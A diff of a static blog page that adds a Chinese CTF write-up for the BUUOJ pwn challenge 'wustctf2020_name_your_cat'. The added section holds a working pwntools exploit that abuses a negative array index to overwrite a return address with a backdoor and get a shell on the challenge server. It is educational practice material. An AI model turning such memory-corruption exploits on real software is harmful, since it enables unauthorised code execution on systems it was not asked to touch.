@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1601994965426" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1602140930508" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1601994965426" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1602140930508" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-09-07</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">5.3
+                                    href="#">6.0
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1004</a></span>
+                                    <span class="post-words">words:<a href="#">1147</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -480,6 +480,46 @@ p.sendafter('Give my your shellcode:',shellcode)
 
 p.interactive()
 </code></pre>
+<h2 id="wustctf2020_name_your_cat">wustctf2020_name_your_cat</h2>
+<p>跟dog那个差不多，不过这次传入的是栈的地址，很自然想到改写ret的地址<br>
+<img src="https://l3mon629.github.io/post-images/1602140840885.png" alt="" loading="lazy"><br>
+但是一开始以为是修改array+0x38处的地址，但是后来才意识到函数调用，栈桢迁移了一下，所以动态调试一下<br>
+<img src="https://l3mon629.github.io/post-images/1602140890909.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1602140895738.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1602140901593.png" alt="" loading="lazy"><br>
+有后门，一把梭<br>
+exp</p>
+<pre><code class="language-python">
+from pwn import *
+
+local = 0
+
+binary = &quot;./wustctf2020_name_your_cat&quot;
+
+if local == 1:
+	p = process(binary)
+else:
+	p = remote(&quot;node3.buuoj.cn&quot;,26919)
+
+def dbg():
+	context.log_level = 'debug'
+
+context.terminal = ['tmux','splitw','-h']
+
+def add(index,content):
+	p.sendlineafter('&gt;',str(index))
+	p.sendlineafter('Give your name plz: ',content)
+
+dbg()
+
+backdoor = 0x080485D4
+
+add(-5,p32(backdoor))
+
+#gdb.attach(p)
+
+p.interactive()
+</code></pre>
 
                         </div>
                         
@@ -494,6 +534,7 @@ p.interactive()
 <li><a href="#wustctf2020_name_your_dog">wustctf2020_name_your_dog</a></li>
 <li><a href="#bjdctf_2020_ydsneedgrirlfriend">bjdctf_2020_YDSneedGrirlfriend</a></li>
 <li><a href="#pwnable_orw">pwnable_orw</a></li>
+<li><a href="#wustctf2020_name_your_cat">wustctf2020_name_your_cat</a></li>
 </ul>
 </li>
 </ul>
@@ -527,8 +568,8 @@ p.interactive()
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn2/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1601994965426&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601994965426 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1602140930508&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1602140930508 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -636,7 +677,7 @@ p.interactive()
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1601994965426);
+                    newDate.setTime(1602140930508);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
